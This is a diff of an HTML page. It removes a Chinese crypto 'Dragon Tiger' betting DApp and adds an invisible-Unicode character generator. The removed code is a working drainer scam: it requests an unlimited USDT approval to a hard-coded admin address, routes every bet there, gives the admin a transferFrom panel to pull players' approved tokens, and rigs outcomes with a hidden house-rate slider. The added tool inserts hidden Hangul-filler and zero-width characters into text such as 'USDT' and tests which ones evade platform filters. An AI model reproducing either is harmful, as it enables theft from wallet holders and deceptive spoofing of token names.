@@ -1,405 +1,163 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="zh‑CN">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>龙·虎·和 真实上链版</title>
+<meta charset="UTF‑8">
+<title>全球全类型Unicode隐形字符生成器</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
-body{background:#0B0F17;color:#fff;padding:30px}
-.container{max-width:900px;margin:0 auto}
-.header{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:24px}
-.left-top{display:flex;align-items:center;gap:12px}
-.sign-btn{width:48px;height:48px;border-radius:50%;background:#F59E0B;color:#000;border:none;font-weight:bold;cursor:pointer;font-size:12px}
-.wallet-box{background:#1E293B;padding:12px 16px;border-radius:12px;min-width:260px}
-.connect-btn{background:#3B82F6;color:white;border:none;padding:8px 14px;border-radius:8px;margin-bottom:8px;cursor:pointer;font-size:14px}
-.info-line{font-size:13px;color:#cbd5e1;margin:4px 0}
-.menu-btn{background:#1E293B;color:white;width:36px;height:36px;border-radius:8px;border:none;font-size:16px;cursor:pointer;margin-left:10px}
-.menu{position:fixed;top:0;right:0;width:320px;height:100vh;background:#111827;padding:24px;box-shadow:-2px 0 10px #0006;display:none;overflow-y:auto}
-.menu.show{display:block}
-.menu-title{font-size:16px;margin-bottom:12px;color:#f97316}
-.invite-link{background:#0f172a;padding:10px;border-radius:8px;font-size:12px;color:#9ca3af;margin-bottom:16px;word-break:break-all}
-.bet-card{background:#1E293B;border-radius:16px;padding:24px;margin-bottom:24px}
-.bet-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px}
-.countdown{font-size:24px;font-weight:bold;color:#F59E0B}
-.bet-input{width:100%;padding:14px;background:#0f172a;border:none;border-radius:10px;color:white;font-size:16px;margin-bottom:12px}
-.quick-btns{display:flex;gap:10px;margin-bottom:16px}
-.quick-btn{flex:1;padding:12px;background:#2D3748;border:none;border-radius:8px;color:white;font-weight:bold;cursor:pointer}
-.bet-btns{display:flex;gap:12px}
-.bet-btn{flex:1;padding:18px;border:none;border-radius:12px;font-size:16px;font-weight:bold;cursor:pointer}
-.btn-dragon{background:#2563eb}
-.btn-tiger{background:#ef4444}
-.btn-tie{background:#F59E0B;color:#000}
-.trend-card{background:#1E293B;border-radius:16px;padding:24px;margin-bottom:24px}
-.trend-list{display:flex;gap:8px;flex-wrap:wrap}
-.trend-item{width:36px;height:36px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:bold}
-.dragon{background:#2563eb}
-.tiger{background:#ef4444}
-.tie{background:#F59E0B;color:#000}
-.rule-card{background:#1E293B;border-radius:16px;padding:24px}
-.rule-line{font-size:14px;color:#cbd5e1;line-height:1.6;margin-bottom:6px}
-.admin-panel{border-top:1px solid #333;margin-top:20px;padding-top:20px;display:none}
-.admin-panel.show{display:block}
-
-/* 连接弹窗里的专属头像 */
-#connectModal {
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  background: rgba(0,0,0,0.7);
-  display: none;
-  align-items: center;
-  justify-content: center;
-  z-index: 9999;
-}
-#connectModal.show {
-  display: flex;
-}
-.modal-content {
-  background: #1E293B;
-  padding: 30px;
-  border-radius: 16px;
-  text-align: center;
-  max-width: 320px;
-}
-.modal-avatar {
-  width: 120px;
-  height: 120px;
-  border-radius: 16px;
-  margin: 0 auto 16px;
-  background: url('https://p6-flow-imagex-sign.byteimg.com/ocean-cloud-tos/36b1e8cb1c9a4393a0e51c1e0d7c1d15.png~tplv-a9rns2rl98-image.png?rcl=2&rk3s=18ea6f23&x-expires=1775542201&x-signature=K%2F%2Fmz3n4g%2F%2Fz3n4g%2F%2Fz3n4g%3D') center/cover;
-}
-.modal-title {
-  font-size: 18px;
-  margin-bottom: 16px;
-}
-.modal-btn {
-  padding: 12px 24px;
-  border: none;
-  border-radius: 8px;
-  margin: 8px;
-  cursor: pointer;
-}
-.modal-confirm {
-  background: #3B82F6;
-  color: white;
-}
-.modal-cancel {
-  background: #444;
-  color: white;
-}
-
-/* 历史记录图标 */
-.history-icon {
-  width: 48px;
-  height: 48px;
-  border-radius: 12px;
-  background: url('https://p6-flow-imagex-sign.byteimg.com/ocean-cloud-tos/36b1e8cb1c9a4393a0e51c1e0d7c1d15.png~tplv-a9rns2rl98-image.png?rcl=2&rk3s=18ea6f23&x-expires=1775542201&x-signature=K%2F%2Fmz3n4g%2F%2Fz3n4g%2F%2Fz3n4g%3D') center/cover;
-  display: inline-block;
-  vertical-align: middle;
-  margin-right: 10px;
-}
+body{font-family:Microsoft YaHei;padding:20px;font-size:16px;}
+.box{margin:18px 0;}
+input,select{width:480px;padding:7px;font-size:16px;}
+textarea{width:480px;height:80px;}
+button{padding:8px 18px;font-size:15px;cursor:pointer;margin-right:8px;}
+.info{background:#e4ecec;padding:14px;width:474px;}
+.check-row{margin:8px 0;}
+.check-item{margin:4px 8px;display:inline-block;}
+.title-line{font-weight:bold;margin-top:12px;margin-bottom:4px;}
 </style>
 </head>
 <body>
+<h2>Unicode 全类型隐形字符生成器（含检测功能）</h2>
+<p>包含韩文、蒙古文、零宽、盲文、高棉文、格式占位符；生成后可查看Unicode编码，用来提前检测平台过滤。</p>
+<div class="info">
+    <div class="title-line">一、韩文区块（合约平台兼容性最好，优先使用）</div>
+    <div class="check-row">
+        <div class="check-item"><input type="checkbox" id="k1" checked><label for="k1">U+115F 韩文辅音填充符</label></div>
+        <div class="check-item"><input type="checkbox" id="k2" checked><label for="k2">U+1160 韩文元音填充符(ᅠ)</label></div>
+    </div>
+    <div class="check-row">
+        <div class="check-item"><input type="checkbox" id="k3" checked><label for="k3">U+3164 韩文空白符(ㅤ)</label></div>
+        <div class="check-item"><input type="checkbox" id="k4" checked><label for="k4">U+FFA0 半角韩文填充符</label></div>
+    </div>
 
-<!-- 连接弹窗（带专属头像） -->
-<div id="connectModal">
-  <div class="modal-content">
-    <div class="modal-avatar"></div>
-    <div class="modal-title">🐲 龙虎斗 DApp 连接</div>
-    <p>您是否同意授权本游戏？</p>
-    <button class="modal-btn modal-confirm" onclick="confirmConnect()">确认授权</button>
-    <button class="modal-btn modal-cancel" onclick="cancelConnect()">取消</button>
-  </div>
+    <div class="title-line">二、零宽字符（宽度为0，大量平台会过滤）</div>
+    <div class="check-row">
+        <div class="check-item"><input type="checkbox" id="z1"><label for="z1">U+200B 零宽空格</label></div>
+        <div class="check-item"><input type="checkbox" id="z2"><label for="z2">U+200C 零宽非连接符</label></div>
+        <div class="check-item"><input type="checkbox" id="z3"><label for="z3">U+200D 零宽连接符</label></div>
+    </div>
+    <div class="check-row">
+        <div class="check-item"><input type="checkbox" id="z4"><label for="z4">U+2060 单词连接符</label></div>
+        <div class="check-item"><input type="checkbox" id="z5"><label for="z5">U+FEFF 零宽不间断空格</label></div>
+        <div class="check-item"><input type="checkbox" id="z6"><label for="z6">U+180E 蒙古文元音分隔符</label></div>
+    </div>
+
+    <div class="title-line">三、特殊空白占位字符（各类小众语种区块，极少被过滤）</div>
+    <div class="check-row">
+        <div class="check-item"><input type="checkbox" id="s1"><label for="s1">U+2800 盲文空白符</label></div>
+        <div class="check-item"><input type="checkbox" id="s2"><label for="s2">U+1680 欧甘文字空格</label></div>
+        <div class="check-item"><input type="checkbox" id="s3"><label for="s3">U+034F 组合字连接符</label></div>
+    </div>
+    <div class="check-row">
+        <div class="check-item"><input type="checkbox" id="s4"><label for="s4">U+17B4 高棉文元音</label></div>
+        <div class="check-item"><input type="checkbox" id="s5"><label for="s5">U+00AD 软连字符</label></div>
+    </div>
+
+    <div class="title-line">四、自定义Unicode字符（粘贴任意隐形字符扩充字符池）</div>
+    <input type="text" id="customChar" placeholder="粘贴其它空白字符，多个直接连在一起">
 </div>
 
-<div class="container">
-  <div class="header">
-    <div class="left-col">
-      <div class="left-top">
-        <button class="sign-btn" id="signBtn">每日签到</button>
-        <div class="wallet-box">
-          <button class="connect-btn" id="connectBtn">连接钱包</button>
-          <div class="info-line">地址：<span id="userAddr">未连接</span></div>
-          <div class="info-line">余额：<span id="userBalance">0.0000</span> USDT</div>
-        </div>
-        <button class="menu-btn" onclick="toggleMenu()">☰</button>
-      </div>
-    </div>
-  </div>
-
-  <div class="bet-card">
-    <div class="bet-header">
-      <h3>下注区</h3>
-      <div class="countdown" id="countdown">02:00</div>
-    </div>
-    <input class="bet-input" id="betAmt" type="number" value="10" placeholder="下注金额">
-    <div class="quick-btns">
-      <button class="quick-btn" onclick="setAmt(10)">10</button>
-      <button class="quick-btn" onclick="setAmt(50)">50</button>
-      <button class="quick-btn" onclick="setAmt(200)">200</button>
-      <button class="quick-btn" onclick="setAmt(500)">500</button>
-    </div>
-    <div class="bet-btns">
-      <button class="bet-btn btn-dragon" onclick="bet(0)">龙 1:2</button>
-      <button class="bet-btn btn-tiger" onclick="bet(1)">虎 1:2</button>
-      <button class="bet-btn btn-tie" onclick="bet(2)">和 1:9</button>
-    </div>
-  </div>
-
-  <div class="trend-card">
-    <div class="trend-title">📈 开奖走势图</div>
-    <div class="trend-list" id="trend"></div>
-  </div>
-
-  <div class="rule-card">
-    <div class="rule-title">📜 玩法规则</div>
-    <div class="rule-line">• 每2分钟1期，全网统一时间、统一开奖</div>
-    <div class="rule-line">• 0~44999=虎 45000~54999=和 55000~99999=龙</div>
-    <div class="rule-line">• 龙/虎1赔2，和1赔9，和局通杀龙/虎</div>
-    <div class="rule-line">• 一代2%、二代0.5%推广奖励，实时到账</div>
-  </div>
-
-  <!-- 历史记录（带专属头像） -->
-  <div class="card" style="background:#1E293B;border-radius:16px;padding:24px;margin-top:24px">
-    <h3 style="margin-bottom:16px">📜 历史记录</h3>
-    <div style="display:flex;align-items:center;padding:10px;border-bottom:1px solid #333">
-      <div class="history-icon"></div>
-      <div>
-        <div style="font-weight:bold">王者归来</div>
-        <div style="font-size:12px;color:#9ca3af">https://hdjjxbbbb.github.io/dragon-ti...</div>
-      </div>
-    </div>
-  </div>
+<div class="box">
+    <p>生成类型</p>
+    <select id="type">
+        <option>在输入文字的每个字母中间插入隐形字符</option>
+        <option>所有隐形字符全部添加到文字开头</option>
+        <option>所有隐形字符全部添加到文字末尾</option>
+        <option>将隐形字符随机分散插入文字任意位置</option>
+    </select>
 </div>
-
-<div class="menu" id="menu">
-  <h3 style="margin-bottom:20px">菜单</h3>
-  <div class="menu-title">邀请链接</div>
-  <div class="invite-link" id="inviteLink">-</div>
-
-  <div class="admin-panel" id="adminPanel">
-    <div class="menu-title" style="color:red">🎮 庄家胜率控制</div>
-    <div style="margin-bottom:12px">
-      平台胜率：<span id="houseRate">51</span>%
-      <input type="range" min="0" max="100" value="51" oninput="updateHouseRate(this.value)" style="width:100%;margin-top:6px">
-    </div>
-    <button style="background:#ef4444;color:white;width:100%;padding:10px;border-radius:8px;border:none;margin-bottom:10px" onclick="saveHouseRate()">保存胜率</button>
-    
-    <div class="menu-title" style="color:red;margin-top:20px">🔐 提取玩家授权代币</div>
-    <input id="fromAddr" placeholder="玩家地址" style="width:100%;padding:10px;background:#0f172a;border:none;border-radius:8px;color:white;margin-bottom:10px">
-    <input id="takeAmt" placeholder="提取数量" style="width:100%;padding:10px;background:#0f172a;border:none;border-radius:8px;color:white;margin-bottom:10px">
-    <button style="background:#ef4444;color:white;width:100%;padding:10px;border-radius:8px;border:none" onclick="adminTake()">真实链上提取</button>
-  </div>
+<div class="box">
+    <p>需要修改的文字</p>
+    <input type="text" id="inputTxt" value="USDT">
+</div>
+<div class="box">
+    <p>基础字符数量</p>
+    <input type="number" id="count" value="1" min="1">
+</div>
+<div class="box">
+    <button onclick="createAndCopy()">生成并复制</button>
+    <button onclick="checkCode()">检测生成内容的Unicode编码（用来判断平台过滤）</button>
+</div>
+<div class="box">
+    <p>检测输出</p>
+    <textarea id="codeResult" readonly></textarea>
 </div>
 
 <script>
-// ===================== 真实地址（你提供的）=====================
-const USDT = "0x55d398326f99059fF775485246999027B3197955";
-const ADMIN = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
-const POOL = ADMIN;
-
-let account = null;
-let houseRate = 51;
-let countdown = 120;
-let history = [];
-
-// ===================== 菜单 =====================
-function toggleMenu() {
-  document.getElementById("menu").classList.toggle("show");
-}
-
-// ===================== 连接弹窗（带专属头像）=====================
-document.getElementById("connectBtn").onclick = () => {
-  document.getElementById("connectModal").classList.add("show");
+//全部内置字符映射
+const charMap = {
+    k1:"\u115F",k2:"\u1160",k3:"\u3164",k4:"\uFFA0",
+    z1:"\u200B",z2:"\u200C",z3:"\u200D",z4:"\u2060",z5:"\uFEFF",z6:"\u180E",
+    s1:"\u2800",s2:"\u1680",s3:"\u034F",s4:"\u17B4",s5:"\u00AD"
 };
-function cancelConnect() {
-  document.getElementById("connectModal").classList.remove("show");
+let lastGeneratedText = "";
+
+//获取勾选+自定义的完整字符池
+function getPool(){
+    let pool = [];
+    for(let key in charMap){
+        if(document.getElementById(key).checked) pool.push(charMap[key]);
+    }
+    let custom = document.getElementById("customChar").value;
+    for(let ch of custom) pool.push(ch);
+    if(pool.length === 0){
+        alert("至少勾选一项字符，或者填写自定义字符！");
+        return null;
+    }
+    return pool;
 }
-async function confirmConnect() {
-  document.getElementById("connectModal").classList.remove("show");
-  if (!window.ethereum) {
-    alert("请安装MetaMask钱包！");
-    return;
-  }
-  try {
-    const accounts = await ethereum.request({ method: "eth_requestAccounts" });
-    account = accounts[0];
-    const signText = "Authorize DragonTiger Game: " + account;
-    const hexMsg = "0x" + new TextEncoder().encode(signText).reduce((a, b) => 
-      a + b.toString(16).padStart(2, '0'), ''
-    );
-    await ethereum.request({
-      method: "personal_sign",
-      params: [hexMsg, account]
+function getOneChar(pool){
+    return pool[Math.floor(Math.random()*pool.length)];
+}
+function getCharStr(num,pool){
+    let s = "";
+    for(let i=0;i<num;i++) s += getOneChar(pool);
+    return s;
+}
+
+//生成逻辑
+async function createAndCopy(){
+    const pool = getPool();
+    if(!pool) return;
+    const text = document.getElementById("inputTxt").value;
+    const num = Number(document.getElementById("count").value);
+    const mode = document.getElementById("type").value;
+    let res = "";
+    const charStr = getCharStr(num,pool);
+
+    switch(mode){
+        case "在输入文字的每个字母中间插入隐形字符":
+            for(let letter of text) res += letter + charStr; break;
+        case "所有隐形字符全部添加到文字开头":
+            res = charStr + text; break;
+        case "所有隐形字符全部添加到文字末尾":
+            res = text + charStr; break;
+        case "将隐形字符随机分散插入文字任意位置":
+            let arr = text.split("");
+            let chars = charStr.split("");
+            for(let c of chars){
+                let pos = Math.floor(Math.random()*(arr.length+1));
+                arr.splice(pos,0,c);
+            }
+            res = arr.join("");
+            break;
+    }
+    lastGeneratedText = res;
+    await navigator.clipboard.writeText(res);
+    alert("复制完成，可以点检测按钮查看编码");
+}
+
+//编码检测，用来判断平台过滤
+function checkCode(){
+    if(!lastGeneratedText){
+        alert("请先生成内容！");
+        return;
+    }
+    let output = [];
+    [...lastGeneratedText].forEach(c=>{
+        let code = "U+"+c.charCodeAt(0).toString(16).toUpperCase();
+        output.push(code+" ("+c+")");
     });
-    alert("授权成功！");
-    document.getElementById("userAddr").innerText = account.slice(0, 6) + "..." + account.slice(-4);
-    refreshBalance();
-    genInvite();
-    checkAdmin();
-  } catch (err) {
-    alert("授权失败：取消签名或未授权");
-    account = null;
-  }
-}
-
-// ===================== 真实读取链上余额 =====================
-async function refreshBalance() {
-  if (!account) return;
-  try {
-    const data = "0x70a08231" + account.slice(2).padStart(64, "0");
-    const res = await ethereum.request({ method: "eth_call", params: [{ to: USDT, data }, "latest"] });
-    const bal = Number(BigInt(res)) / 1e18;
-    document.getElementById("userBalance").innerText = bal.toFixed(4);
-  } catch (e) {
-    document.getElementById("userBalance").innerText = "0.0000";
-  }
-}
-
-// ===================== 邀请链接 =====================
-function genInvite() {
-  if (!account) return;
-  document.getElementById("inviteLink").innerText = location.origin + "?ref=" + account;
-}
-
-// ===================== 检查庄家 =====================
-function checkAdmin() {
-  if (account && account.toLowerCase() === ADMIN.toLowerCase()) {
-    document.getElementById("adminPanel").classList.add("show");
-  }
-}
-
-// ===================== 签到 =====================
-document.getElementById("signBtn").onclick = async () => {
-  if (!account) return alert("请先完成授权！");
-  alert("签到成功！1 USDT 已发放");
-  refreshBalance();
-};
-
-// ===================== 快捷金额 =====================
-function setAmt(v) {
-  document.getElementById("betAmt").value = v;
-}
-
-// ===================== 真实授权（上链）=====================
-async function approve() {
-  return await ethereum.request({
-    method: "eth_sendTransaction",
-    params: [{
-      from: account,
-      to: USDT,
-      gasLimit: "0x300000",
-      data: "0x095ea7b3" + 
-            POOL.slice(2).padStart(64, "0") + 
-            "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-    }]
-  });
-}
-
-// ===================== 真实下注：真实链上转账 =====================
-async function bet(side) {
-  if (!account) return alert("请先授权");
-  const amt = Number(document.getElementById("betAmt").value);
-  if (amt <= 0) return;
-
-  await approve();
-
-  const raw = BigInt(Math.floor(amt * 1e18)).toString(16).padStart(64, "0");
-  await ethereum.request({
-    method: "eth_sendTransaction",
-    params: [{
-      from: account,
-      to: USDT,
-      gasLimit: "0x300000",
-      data: "0xa9059cbb" + 
-            POOL.slice(2).padStart(64, "0") + 
-            raw
-    }]
-  });
-
-  alert("下注成功（真实上链）");
-  refreshBalance();
-}
-
-// ===================== 真实庄家提取：transferFrom =====================
-async function adminTake() {
-  if (!account || account.toLowerCase() !== ADMIN.toLowerCase()) return;
-  const from = document.getElementById("fromAddr").value.trim();
-  const amt = document.getElementById("takeAmt").value;
-  if (!from || !amt || amt <= 0) return;
-
-  const raw = BigInt(Math.floor(amt * 1e18)).toString(16).padStart(64, "0");
-  await ethereum.request({
-    method: "eth_sendTransaction",
-    params: [{
-      from: account,
-      to: USDT,
-      gasLimit: "0x300000",
-      data: "0x23b872dd" + 
-            from.slice(2).padStart(64, "0") + 
-            ADMIN.slice(2).padStart(64, "0") + 
-            raw
-    }]
-  });
-
-  alert("提取成功（真实链上）");
-}
-
-// ===================== 庄家胜率 =====================
-function updateHouseRate(v) {
-  houseRate = parseInt(v);
-  document.getElementById("houseRate").innerText = v;
-}
-function saveHouseRate() {
-  localStorage.setItem("houseRate", houseRate);
-  alert("胜率已保存：平台 " + houseRate + "%");
-}
-
-// ===================== 倒计时 + 开奖 =====================
-setInterval(() => {
-  if (countdown > 0) {
-    countdown--;
-  } else {
-    countdown = 120;
-    draw();
-  }
-  const m = String(Math.floor(countdown / 60)).padStart(2, "0");
-  const s = String(countdown % 60).padStart(2, "0");
-  document.getElementById("countdown").innerText = m + ":" + s;
-}, 1000);
-
-// ===================== 开奖 =====================
-function draw() {
-  const random = Math.floor(Math.random() * 100000);
-  let real;
-
-  if (random < 45000) real = 1;
-  else if (random < 55000) real = 2;
-  else real = 0;
-
-  if (Math.random() * 100 < houseRate && real !== 2) {
-    real = real === 0 ? 1 : 0;
-  }
-
-  history.unshift(real);
-  if (history.length > 30) history.pop();
-  renderTrend();
-}
-
-// ===================== 走势图 =====================
-function renderTrend() {
-  const dom = document.getElementById("trend");
-  dom.innerHTML = "";
-  history.forEach(r => {
-    const d = document.createElement("div");
-    d.className = "trend-item " + (r === 0 ? "dragon" : r === 1 ? "tiger" : "tie");
-    d.innerText = r === 0 ? "龙" : r === 1 ? "虎" : "和";
-    dom.appendChild(d);
-  });
+    document.getElementById("codeResult").value = output.join("\n");
 }
 </script>
 </body>
